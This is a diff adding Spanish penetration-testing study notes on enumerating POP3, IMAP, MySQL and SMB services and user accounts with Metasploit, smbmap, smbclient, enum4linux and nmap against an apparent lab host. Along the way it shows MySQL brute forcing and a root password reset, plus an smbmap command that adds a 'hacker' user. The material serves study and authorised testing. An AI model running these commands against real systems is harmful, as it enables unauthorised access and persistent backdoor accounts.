+  A diferencia de otros servicios, POP3 tiene una superficie de enumeración más reducida que HTTP o SMB, pero es especialmente valioso porque los correos electrónicos suelen contener información sensible: credenciales, enlaces de restablecimiento de contraseña, datos internos de la organización.</p>
+
+
+  <h3> :radio_button: vectores de ataque en POP3 </h3>
+
+
+ <p align="center">
+
+ <img src="https://i.postimg.cc/cLwdhjG2/262.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+
+<!----------------------------------------------------------------------------- ## IMAP Internet Message Access Protocol ----------------------------------------------------------------------------------------------------------------->
+
+
+</br> 
+
+
+<h2> :white_check_mark: Internet Message Access Protocol (IMAP)  </h2> 
+
+
+<h3> :radio_button: Puerto predeterminado 143  </h3> 
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/nhpnd2FS/263.png" alt="Descripción de la imagen">
+
+</p>
+
+
+ <p> Protocolo de acceso a mensajes de Internet (IMAP) es más sofisticado que POP3. IMAP permite mantener el correo electrónico sincronizado en múltiples dispositivos (y clientes de correo). Si marca un mensaje de correo electrónico como leído al revisar su correo electrónico en su teléfono inteligente, el cambio se guarda en el IMAP servidor (MDA) y se replica en su computadora portátil cuando sincroniza su bandeja de entrada. </p>
+
+
+
+  <p> El puerto 143 es el predeterminado para IMAP usando texto sin cifrar. Muchos servidores admiten actualizar la conexión a TLS usando el comando STARTTLS..</p>
+  <p> El puerto 993 se utiliza para IMAPS (IMAPsobre implícito TLS). La conexión está cifrada desde el principio.</p>
+
+
+<p> Hoy en día, la mayoría de los proveedores de correo electrónico requieren IMAPS en el puerto 993. Los principales proveedores como Gmail, Outlook y Yahoo han desactivado el texto sin formato IMAP acceso completo. Sin embargo, es posible que aún encuentres texto sin formato IMAP en servidores de correo internos o sistemas heredados. </p>
+
+
+
+
+ <h3> :radio_button: Comandos del protocolo IMAP </h3>
+
+
+<p> La enumeración de IMAP permite al atacante:</p>
+
+
+
+<p>&nbsp; <b>• Acceso persistente: </b>&nbsp; A diferencia de POP3Los correos electrónicos permanecen en el servidor. Un atacante con IMAPLas credenciales pueden continuar leyendo nuevos correos electrónicos indefinidamente. </p>
+<p>&nbsp; <b>• Datos históricos: </b>&nbsp; Se puede acceder a todo el historial del buzón, que potencialmente contiene años de comunicaciones confidenciales. </p>
+<p>&nbsp; <b>• Abuso de restablecimiento de contraseña:  </b>&nbsp; los atacantes pueden buscar correos electrónicos de restablecimiento de contraseña para obtener acceso a otras cuentas.) </p>
+<p>&nbsp; <b>• Compromiso con el correo electrónico empresarial:  </b>&nbsp; el acceso al correo electrónico corporativo permite el fraude de facturas, la suplantación de identidad y el robo de datos.</p>
+<p>&nbsp; <b>• Movimiento lateral:  </b>&nbsp; los correos electrónicos suelen contener credenciales, documentación interna e información útil para futuros ataques.</p>
+
+
+
+
+
+<!----------------------------------------------------------------------------- ## MySQL Enumeration ------------------------------------------------------------------------------------------------------------------>
+
+</br> 
+
+
+<h2> :white_check_mark: MySQL Enumeration</h2> 
+
+
+<h3> :radio_button: Puerto predeterminado 3306  </h3> 
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/XYzCxz0D/192.png" alt="Descripción de la imagen">
+
+
+
+
+<p> MySQL es un sistema de gestión de bases de datos relacional (RDBMS) de código abierto, extremadamente popular en entornos web y aplicaciones empresariales. Normalmente corre en el puerto 3306 (TCP). También puede estar en puertos alternativos o detrás de un proxy.</p>
+
+
+<p> La enuneracion consiste en identificar y extraer información del servicio MySQL para descubrir vulnerabilidades, configuraciones inseguras y vectores de ataque</p>
+
+<p> Una vez identificado el servicio, se busca obtener: </p>
+
+
+
+<p>&nbsp; <b>• Versión de MySQL y sistema operativo </b>&nbsp; crucial para buscar CVEs conocidos </p>
+<p>&nbsp; <b>• Usuarios y cuentas </b>&nbsp; (root, anónimas, por defecto) </p>
+<p>&nbsp; <b>• Bases de datos disponibles  </b>&nbsp; (information_schema, mysql, databases de aplicación) </p>
+<p>&nbsp; <b>• Tablas y columnas sensibles </b>&nbsp; (usuarios, contraseñas, tokens, datos personales) </p>
+<p>&nbsp; <b>• Privilegios de usuarios </b>&nbsp; (FILE, SUPER, SELECT, CREATE, etc.)</p>
+<p>&nbsp; <b>• Variables de configuración </b>&nbsp; (secure_file_priv, local_infile, sql_mode, etc.) </p>
+<p>&nbsp; <b>• Plugins y extensiones </b>&nbsp; (UDFs, stored procedures maliciosos) </p>
+
+
+
+<h3> :radio_button: Pasos de enumeracion MySQL</h3>
+
+<p> Filtrar los modulos auxiliares relacionados con MySQL: <b>search type:auxiliary name:MySQL</b> </p>
+ 
+ 
+ 
+<p> 1. Identificar la version de MySQL que esta corriendo en el servidor</p>
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/Vv4StqxX/189.png" alt="Descripción de la imagen">
+
+</p>
+
+<p> Resultado: 192.168.232.131:3306 is running MySQL 5.0.51a-3ubuntu5 (protocol 10) </p>
+
+
+<p> Exploit disponibles para esta version de MySQL </p>
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/VNRS6LKK/190.png" alt="Descripción de la imagen">
+
+</p>
+
+<p> 2. Fuerza bruta MySQL </p>
+
+<p> Configurar los parametros</p>
+
+<p> • BLANK_PASSWORDS - Probar contraseñas en blanco para todos los usuarios </p>
+
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/PJcW3WNY/193.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/nhfMGQ5d/194.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<p> Con el parametro <b> "CREDS"</b> se pueden ver los resultados</p>
+
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/SNf8zbf8/195.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> 3. Ingresar a la base de datos con las credenciales obteninas  </p>
+
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/VkTjzBR1/196.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/8kHM7V4g/197.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/vZp6J8Yw/198.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> Se puede realizar el cambio de contraseña de los usuarios de las bases de datos </p>
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/D0ZZWRvg/199.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> En este caso se realiza el cambio de contraseña del usuarios root al cual le colocamos la contraseña 12345 </p>
+
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/2SXPmJMZ/200.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> Esta cadena representa un hash de contraseña clásico de MySQL (versión 4.1 o posterior). Corresponde exactamente a la contraseña "12345", generada mediante la función PASSWORD() de MySQL</p>
+
+<p> El algoritmo aplicado implica un cifrado doble con SHA-1</p>
+
+<p> Hash = SHA1(SHA1(cadena))</p>
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/mrzKrjWq/201.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<p> 4. El modulo auxiliar mysql_enum nos permite ver una gran cantridad de informacion </p>
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/BnYd46tm/202.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<p> 5. El modulo <b> mysql_sql </b>permite ejecutar sentencias SQL sencillas en una instancia de MySQL, siempre que se disponga de las credenciales adecuadas </p>
+
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/MKMnwc9L/203.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<p> Realizar consultas dentro de la base de datos </p>
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/7ZSbCF8X/204.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> 6. El modulo <b> mysql_schemadump </b>extrae la información del esquema de un servidor de base de datos MySQL. </p>
+
+
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/d0B16G01/205.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+
+<p> ----------------------------------- Pendiente documentar-------------------------------------------</p>
+
+
+<p><h2> 2.&nbsp; Enumeración SNMP </h2> Extracción de información de dispositivos que utilizan el Protocolo Simple de Administración de Red (SNMP). 
+      Permite extraer configuraciones de red, interfaces, direcciones IP y procesos en ejecución</p>
+
+
+<p> ----------------------------------- Pendiente documentar-------------------------------------------</p>
+
+
+
+<p><h2> 2.&nbsp; Enumeración LDAP </h2> (Protocolo Ligero de Acceso a Directorios) se utiliza para acceder y mantener servicios de información de directorio 
+    distribuidos a través de una red IP. Permite extraer nombres de usuario, direcciones de correo electrónico, grupos, departamentos y servidores del directorio.</p>
+
+
+<p> ----------------------------------- Pendiente documentar-------------------------------------------</p>
+
+
+
+
+<p> <b> Nota importante  </b> Para cada protocolo de texto sin cifrar, existe una alternativa segura. Las implementaciones modernas deben utilizar variantes cifradas (HTTPS, SFTP, IMAPS, SSH) para proteger los datos en tránsito y evitar ataques como rastreo, man-in-the-middle y ataques de contraseñas. </p>
+
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/fykh4qtD/264.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+
+
+<!----------------------------------------------------------------------------- ## Enumeracion de servicios de Recursos compartidos ------------------------------------------------------------------------------------------------------------------>
+
+
+
+</br>
+
+<div id="user-content-toc">
+  <ul align="center">
+    <summary><a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=700&size=40&pause=1000&color=FF4E4E&width=800&height=500&lines=T1135+%3A+Network+Share+Discovery" alt="Typing SVG" /></a></summary>
+  </ul>
+</div>
+
+</br>
+
+
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/rp4cs4zV/256.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+
+<p> Los adversarios pueden buscar carpetas y unidades compartidas en sistemas remotos como medio para identificar fuentes de información para recopilar como precursoras de la Recopilación e identificar posibles sistemas de interés para el Movimiento Lateral. Las redes a menudo contienen unidades de red y carpetas compartidas que permiten a los usuarios acceder a directorios de archivos en varios sistemas de una red.
+
+
+El intercambio de archivos a través de una red Windows se realiza mediante el protocolo SMB. Net se puede utilizar para consultar un sistema remoto en busca de unidades compartidas disponibles mediante el comando. También se puede utilizar para consultar unidades compartidas en el sistema local utilizando . Para macOS, el comando enumera todos los puntos compartidos utilizados para los servicios smb. net view \\remotesystemnet sharesharing -l
+
+
+</p>
+
+
+
+<!----------------------------------------------------------------------------- ## Enumeracion SMB ------------------------------------------------------------------------------------------------------------------>
+
+
+
+<h2> :white_check_mark: Enumeración SMB </h2> 
+
+
+
+
+<h3> :radio_button: Puerto predeterminado 445  </h3> 
+
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/BvfscT0D/smbmap.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+<p><b>(Server Message Block)</b> Es un protocolo de intercabio de archivos en red que se utiliza para facilitar el intercambio de archivos entre computadores de una red local (Carpeta compartida), acceso a impresoras que estan conectadas en el PC </p>
+
+
+<p> • Windows: Puertos predeterminado: 445/tcp (SMB sobre TCP/IP) versiones anteriores 139/tcp (NetBIOS).</p>
+<p> • Linux: Samba </p>
+
+
+<p> Versiones de SMB en Windows:
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/T1XGnX66/SMB-W.png" alt="Descripción de la imagen">
+
+ </p>
+
+<p> Versiones de SMB en Linux (Samba)
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/N09wV0Gt/SMB-L.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+</br>
+
+
+<h3> :radio_button: Pasos de enumeracion SMB con NMAP</h3>
+
+
+<p>&nbsp;• -sV :&nbsp; Detecta la versión de SMB. </p>
+<p>&nbsp;• smb-enum-shares :&nbsp; Enumerar los recursos compartidos, permisos, configuraciones inseguras, metadatos y prepara ataques posteriores </p>
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/dVJN883r/3.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+
+<h3> :radio_button: Enumeracion de usuarios con RCPCLIENT </h3>
+
+<p> RCPCLIENT &nbsp; Es una herramienta de línea de comandos incluida en el paquete Samba que permite interactuar con servidores Windows mediante RPC (llamadas a procedimiento remoto). Es útil para enumerar usuarios, grupos, políticas y más en sistemas Windows (o Samba en Linux).</p>
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/Y0MXYtdY/1.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+
+<h3> &nbsp; :radio_button: Enumeracion de SMB con Metasploit</h3>
+
+
+<p> 1. Identificar la version de SMB para conocer sus vulnerabilidades y exploit disponibles para usarlo en la fase de explotacion</p>
+
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/5yTssfvk/168.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+<p> 2. Escoger el modulo auxiliar teniendo en cuenta la informacion que se desea recopilar</p>
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/fRhGsvtm/169.png" alt="Descripción de la imagen">
+
+ </p>
+
+<p><b>:white_check_mark: auxiliary/scanner/smb/smb_enumusers</b> (Determinar qué usuarios existen a través del servicio SAM RPC.)</p>
+
+
+<p><b>:white_check_mark: auxiliary/scanner/smb/smb_enumshares</b> (Este módulo determina qué recursos compartidos proporciona el servicio SMB y cuáles son de lectura/escritura. También recopila información adicional como tipos de recursos compartidos,
+directorios, archivos, marcas de tiempo, etc.)</p>
+
+
+<p><b>:white_check_mark: auxiliary/scanner/smb/smb_login</b> (Este módulo probará el inicio de sesión SMB en varias máquinas y informará sobre los inicios de sesión exitosos. Si ha cargado un complemento de base de datos y se ha conectado a una base de datos, este módulo registrará los inicios de sesión exitosos
+y los hosts para que pueda realizar un seguimiento de su acceso.)</p>
+
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/vB30JrRq/2.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+ <p align="center">
+
+ <img src="https://i.postimg.cc/8zRm8RMF/8.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+
+<h3> :radio_button: SMBMAP</h3>
+
+
+<p> Herramienta diseñada  para enumerar, explorar y explotar recursos compartidos SMB </p>
+
+</br>
+
+<p> • Enumerar recursos compartidos (shares) sin autenticación o con credenciales </p>
+<p> &nbsp; Sin credenciales ( bash:&nbsp; smbmap -[target_IP] ) </p>
+<p> &nbsp; Con credenciales ( bash:&nbsp; smbmap -H [target_IP] -u [usuario] -p [contraseña]) </p>
+
+<p> • Explorar el contenido de un recurso compartido</p>
+<p> &nbsp; ( bash:&nbsp; smbmap -H [target_IP] -u [usuario] -p [contraseña] -r [recurso_compartido]) </p>
+
+<p> • Descargar/Subir archivos (si los permisos lo permiten)</p>
+<p> &nbsp; Descargar un archivo : ( bash:&nbsp; smbmap -H [target_IP] -u [usuario] -p [contraseña] --dowload [ruta remota] </p>
+<p> &nbsp; Cargar un archivo : ( bash:&nbsp; smbmap -H [target_IP] -u [usuario] -p [contraseña] --upload [archivo_local] [ruta remota] </p>
+
+<p> • Ejecución de comandos remotos (si hay suficientes privilegios)</p>
+<p> &nbsp; ( bash:&nbsp; smbmap -H [target_IP] -u [usuario] -p [contraseña] -x "net user hacker P@ssw0rd /add ) </p>
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/J0nZrzzy/4.png" alt="Descripción de la imagen">
+
+ </p>
+
+ <p> Solo se tiene acceso al recurso compartido temporales (tmp) el cual se encuentra en READ, WHRITE </p>
+
+
+
+<p> El usuario msfadmin tiene permisos para leer el recurso compartido (print$), leer el recurso compartido (opt) y permiso de lectura y escritura en los directorios </p>
+<p> Iniciar sesion con el usuario y contraseña msfadmin </p>
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/mrrPF29B/9.png" alt="Descripción de la imagen">
+
+  </p>
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/kXdzMVr6/10.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+
+ <h3> :radio_button: SMBCLIENT</h3>
+
+ <p> La herramienta permite interactuar con recursos compartidos </p>
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/qBDpDXWc/5-1.png" alt="Descripción de la imagen">
+
+ </p>
+
+<p> Acceder a los recursos compartidos, se puede usar la funcion publica o seleccionar el usuario "smbclient\\\\192.168.232.131\\public -U admin"</p>
+
+<p> El comando get permite la descarga del recurso</p>
+<p> Al ingresar al recurso compartido tmp, es posible visualizar los archivos temporales, validar los permisos de escritura y descargar archivos para revisar su contenido </p>
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/KvLvK3sn/6.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+
+<p><b> Comandos basicos</b></p>
+
+<p>&nbsp; <b>• Recursos compartidos (Shares):</b>&nbsp; Lista de carpetas, impresoras u otros recursos compartidos en la red.&nbsp;<br>
+<b>( bash:&nbsp; smbclient -L // [target_IP] -N )</b></p>
+
+<p>&nbsp; <b>• Usuarios y Grupos:</b>&nbsp; Nombres de usuarios válidos en el sistema, lo que puede ser útil para ataques de fuerza bruta o phishing. &nbsp;<br>
+<b>( bash:&nbsp; enum4linux -U [target_IP] )</b></p>
+
+<p>&nbsp; <b>• Información del Sistema Operativo:</b>&nbsp; Detalles como el nombre, versión y build del sistema operativo. &nbsp;<br>
+<b>( bash:&nbsp; nmap --script smb-os-discovery -p 445 [target_IP] )</b></p>
+
+<p>&nbsp; <b>• Sesiones Activas:</b>&nbsp;  Lista de usuarios que tienen sesiones activas en el servidor SMB. &nbsp;<br>
+<b>( bash:&nbsp; net session \\ [target_IP] )</b></p>
+
+<p>&nbsp; <b>• Configuraciones de Seguridad:</b>&nbsp;  Lista de usuarios que tienen sesiones activas en el servidor SMB. &nbsp; <br>
+<b>( bash:&nbsp; enum4linux [target_IP] )</b></p>
+
+<p>&nbsp; <b>• Vulnerabilidades Conocidas:</b>&nbsp;  Si el sistema aún utiliza SMBv1, puede ser vulnerable a ataques como EternalBlue. &nbsp;<br>
+<b>( bash:&nbsp;  nmap --script smb-protocols -p 445 [target_IP] )</b></p>
+
+
+
+<p> ----------------------------------- Pendiente documentar-------------------------------------------</p>
+
+
+<p><h2> 2.&nbsp; Enumeración NFS </h2> NFS permite que un servidor comparta directorios y archivos con uno o más clientes a través de una red. Los clientes pueden montar esos recursos compartidos como si fueran unidades locales, facilitando el acceso centralizado a datos</p>
+
+
+<p> ----------------------------------- Pendiente documentar-------------------------------------------</p>
+
+
+
+<p> ----------------------------------- Pendiente documentar-------------------------------------------</p>
+
+
+<p><h2> 2.&nbsp; Enumeración NetBIOS </h2> recopilación de información sobre recursos compartidos, cuentas de usuario y servicios en redes de Windows</p>
+
+
+<p> ----------------------------------- Pendiente documentar-------------------------------------------</p>
+    
+
+
+
+
+
+<!----------------------------------------------------------------------------- ## Users Enumeration ------------------------------------------------------------------------------------------------------------------>
+
+
+
+
+</br>
+
+<div id="user-content-toc">
+  <ul align="center">
+    <summary><a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=700&size=40&pause=1000&color=FF4E4E&width=800&height=500&lines=T1087+%3A+Users+Enumeration" alt="Typing SVG" /></a></summary>
+  </ul>
+</div>
+
+</br>
+
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/kgQPdmHK/257.png" alt="Descripción de la imagen">
+
+
+
+
+<p>  Los adversarios pueden intentar obtener una lista de cuentas, nombres de usuario o direcciones de correo electrónico válidas en un sistema o dentro de un entorno comprometido. Esta información puede ayudar a los adversarios a determinar qué cuentas existen, lo que puede ayudar en comportamientos posteriores como fuerza bruta, ataques de phishing o apropiaciones de cuentas (por ejemplo, cuentas válidas).
+
+Los adversarios pueden utilizar varios métodos para enumerar cuentas, incluido el abuso de herramientas existentes, comandos integrados y posibles configuraciones incorrectas que filtran nombres de cuentas, roles o permisos en el entorno de destino.
+
+Por ejemplo, los entornos de nube suelen proporcionar interfaces de fácil acceso para obtener listas de usuarios. En los hosts, los adversarios pueden usar PowerShell predeterminado y otras funciones de línea de comandos para identificar cuentas. También se puede extraer información sobre direcciones de correo electrónico y cuentas buscando en los archivos de un sistema infectado.
+
+
+</p>
+
+
+<p><h2> Enumeración de usuarios: </h2> La enumeración de usuarios es una técnica utilizada en pruebas de penetración y auditorías de seguridad para identificar nombres de usuario válidos en un sistema, aplicación o servicio. Este proceso es fundamental en las fases iniciales de un ataque, ya que permite a un atacante conocer qué cuentas existen en el sistema, lo que facilita ataques posteriores como fuerza bruta, phishing o ataques de diccionario.</p>
+
+
+### 🛠 &nbsp;Herramientas
+
+</br>
+
+<p>• RPCClient:  &nbsp; Enumerar usuarios en sistemas Windows</p>
+<p>• Metasploit: &nbsp; (auxiliary modules): Módulos como smb_enumuser
+<p>• enum4linux: &nbsp; Para enumerar usuarios en sistemas SMB/LDAP</p>
+
+
+
+<div id="user-content-toc">
+  <ul align="center">
+    <summary><h3 style="display: inline-block">🛠 enum4linux </h3></summary>
+  </ul>
+</div>
+
+</br>
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/KjnWjJ70/5.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+
+<p>Enum4linux es una herramienta de enumeración para sistemas Windows que se utiliza principalmente para recopilar información sobre usuarios, grupos, recursos compartidos, políticas 
+y otras configuraciones a través del protocolo SMB. Es muy útil en la fase de reconocimiento de un test de penetración para identificar posibles vectores de ataque en redes Windows.</p>
+
+
+<p>&nbsp;&nbsp;&nbsp; enum4linux [host] </p>
+
+<p> • Información sobre objetivos </p>
+<p> • Enumerar grupo de trabajo/dominio</p>
+<p> • Información sobre Nbtstat (tablas de nombres NetBIOS)</p>
+<p> • Comprobación de la sesión</p>
+<p> • Obtención del SID de dominio</p>
+<p> • Información sobre el Sistema Operativo </p>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/cHc90Bmb/1.png" alt="Descripción de la imagen">
+</p>
+
+<p> • Usuarios</p>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/yxQLS62h/2.png" alt="Descripción de la imagen">
+</p>
+
+<p> • Enumeración de acciones </p>
+<p> • Informacion de politicas de contraseñas </p>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/WbzWcrJ5/3.png" alt="Descripción de la imagen">
+</p>
+
+
+<p> • Grupos </p>
+<p> • Enumerando usuarios usando SID  y nombre de usuario '', contraseña ''</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/s2YK44tg/4.png" alt="Descripción de la imagen">
+</p>
+
+
+
+<p>opciones de uso: enum4linux -U [host]  </p>
+
+
+<p> •  -U obtener lista de usuarios </p>
+<p> •  -M obtener lista de máquinas </p>
+<p> •  -S obtener lista compartida </p>
+<p> •  -P obtener información sobre la política de contraseñas </p>
+<p> •  -G obtener lista de grupos y miembros </p>
+<p> •  -d ser detallado, se aplica a -U y -S </p>
+<p> •  -u user especifica el nombre de usuario a utilizar (por defecto «») </p> 
+<p> •  -p pass especificar la contraseña a utilizar (por defecto «») </p>
+<p> •  -i obtiene una lista de impresoras</p>
+<p> •  -a Combina las opciones -U, -S, -G, -P, -r, -o, -n, -i en un solo comando</p>
+<p> •  -k user Usuario(s) que existe(n) en el sistema remoto</p>
+<p> •  -o Obtener información del sistema operativo</p>
+<p> •  -n Hacer un nmblookup (similar a nbtstat)</p>
+<p> •  -v Verbose.  Muestra todos los comandos que se están ejecutando (net, rpcclient, etc.)</p>
+<p> •  -A Agresivo. Realiza comprobaciones de escritura en recursos compartidos, etc.</p>
+
+
+
+
+
+
+
+<p><h3> Enumeración de usuarios en KERBEROS </h3> La enumeración de usuarios en Kerberos es una técnica utilizada para identificar cuentas de usuario válidas en un entorno de autenticación basado en Kerberos, común en entornos de Active Directory (AD). Kerberos es un protocolo de autenticación de red que utiliza tickets para permitir nodos comunicarse de manera segura. Aunque Kerberos está diseñado para ser seguro, ciertos comportamientos pueden permitir la enumeración de usuarios.</p>
+
+
+<h2> Enumeración de Recursos Compartidos </h2>
+
+
+
+<p> ----------------------------------- Pendiente documentar-------------------------------------------</p>
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/50fDJ3P2/8.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+
+
+
+
+
+
+
+
+</br>
+
+### 🛠 &nbsp;Herramientas
+
+</br>
+
+<p><b> • Descubrimiento de contenido :</b> Gobuster, Dirbuster, Feroxbuster</p>
+<p><b> • Pruebas de aplicaciones web :</b> Burp Suite, OWASP ZAP, Nuclei</p>
+<p><b> • Análisis de vulnerabilidades :</b> SQLmap, Nikto</p>
+<p><b> • Enumeración del sistema operativo :</b> PEASS, enum4linux</p>
+<p><b> • Marcos de reconocimiento :</b> Marcos de reconocimiento: Recon-ng, ReconFTW, rengine</p>
+
+</br>
+
+### 🛠 &nbsp;Herramientas recomendadas
+
+</br>
+
+
+<!----------------------------------------------------------------------------- ## Análisis de vulnerabilidades ------------------------------------------------------------------------------------------------------------------>
+
+
+
+<!--horizontal divider(gradiant)-->
+<img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif">
+
+
+</br>
+
+<div id="user-content-toc">
+  <ul align="center">
+    <summary><a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=40&pause=1000&color=F70000&width=760&height=60&lines=Fase+2.+Vulnerability+Assessment" alt="Typing SVG" /></a></summary>
+  </ul>
+</div>
+
+</br>
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/yNw1RfSz/219.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+
+<h3><b> Vulnerability x Threat = Risk </b></h3>
+
+
+<p>:white_check_mark: Una Vulnerabilidad es una debilidad o fallo de un sistema de informacion o de una infraestructura TI que podría explotarse para comprometer la seguridad de los sistemas, datos u operaciones.</p>
+
+<p>Se pueden dividir en: </p>
+
+<p><b> :radio_button: Debilidad fisica: </b>&nbsp; Ejemplo un servidor al que puede acceder cualquier persona </p>
+<p><b> :radio_button: Debilidad logica: </b>&nbsp; Ejemplo puertos abiertos o una informacion confidencial en texto claro  </p>
+
+
+<p><b> Vulnerabilidades técnicas</b>son debilidades en el software, los sistemas o las configuraciones que pueden explotarse debido a errores de codificación, configuraciones inseguras o un diseño defectuoso del sistema.</p>
+
+
+<p><b> Una vulnerabilidad por sí sola no representa un riesgo si no existe ninguna amenaza que pueda aprovecharla. Asimismo, una amenaza no puede causar impacto si no existe una vulnerabilidad para explotar</b></p>
+
+
+
+<h3>Amenaza</h3>
+
+
+<p>:white_check_mark: Una Amenaza es una accion que se aprovecha de una vulnerabilidad para atacar la seguridad de un sistema de informacion. Representa una fuente de peligro que puede aprovecharse de una debilidad para comprometer la confidencialidad integridad, y disponibilidad de los sistemas de la organización.</p>
+
+<p><b> :radio_button: Eventos fisica &nbsp; Ejemplo desastres naturales</b></p>
+<p><b> :radio_button: Ataques informaticos &nbsp; Malware  </b></p>
+
+
+
+<h3>Riesgo</h3>
+
+
+<p>:white_check_mark: Riesgo es el daño potencial que podría ocurrir si una amenaza explota con éxito una vulnerabilidad. Podemos determinar el riesgo general de una vulnerabilidad combinando el impacto y la probabilidad de explotación</p>
+
+
+<p><b>Cyber Risk</b>. Es el riesgo a cualquier perdida financiera interrupcion o daño a la reputacion de una organizacion debido a fallas en las tecnologias de informacion</p>
+
+<h3>Gestión de riesgos</h3>
+
+
+<p>La gestión de riesgos suele ser un ciclo continuo que consta de cuatro etapas:r</p>
+
+
+<p><b> :radio_button: Identificación :</b>Identificar activos, vulnerabilidades y amenazas potenciales que podrían afectar a la organización. </p>
+<p><b> :radio_button: Análisis::</b> Evaluar los riesgos para determinar el impacto potencial y la probabilidad de explotación, lo que se traduce en la gravedad de cada riesgo y ayuda a planificar los esfuerzos de remediación.</p>
+<p><b> :radio_button: Mitigación:</b>  Reducir o controlar los riesgos identificados. Esto puede incluir la aplicación de parches de seguridad, fortalecer los controles de acceso, mejorar las configuraciones, implementar herramientas de monitoreo o rediseñar procesos inseguros</p>
+<p><b> :radio_button: Monitoreo </b> Monitoreo continuo de los riesgos para garantizar que los controles sigan siendo efectivos, se detecten nuevas vulnerabilidades y se aborden rápidamente las amenazas emergentes.</p>
+
+
+<p><b> En algunos casos, las organizaciones pueden optar por aceptar o transferir el riesgo si la mitigación no es práctica o rentable. Generalmente se elige aceptar un riesgo si el impacto es mínimo y el costo de reducir el riesgo supera el beneficio. Transferir el riesgo significa transferir la responsabilidad a un tercero, como por ejemplo comprar una póliza de seguro que cubra el costo que conlleva el riesgo. </b></p>
+
+
+<!----------------------------------------------------------------------------- ## Vulnerability Scanning with MSF ------------------------------------------------------------------------------------------------------------------>
+
+
+<h2> :arrow_right:  Vulnerability Scanning with MSF</h2> 
+
+
+<p>En la interacción anterior con Metasploit se logró identificar y explotar configuraciones incorrectas en el servidor objetivo. En este caso, se utilizarán módulos auxiliares para escanear en busca de vulnerabilidades.</p>
+
+
+
+<h3> :radio_button: Pasos </h3>
+
+
+<p> Realizar un escanero al obsetivo </p>
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/fLHZhwDC/226.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+<p> Con el resultado obtenido de los servicios que se enuentran corriendo en el servidor objetivo se puede realizar una busqueda especifica de exploit </p>
+
+
+<p><b> search type:exploit name:...</b></p>
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/Kv19fmVK/227.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+<p> Como se logra observar existen diferentes exploit para el servicio de Mirosoft IIS pero no para la version que se encuentra corriendo el servidor en especifico, por lo cual se puede recurrir a otras herramientas o a sitios WEB </p>
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/505FVKtk/228.png" alt="Descripción de la imagen">
+
+ </p>
+
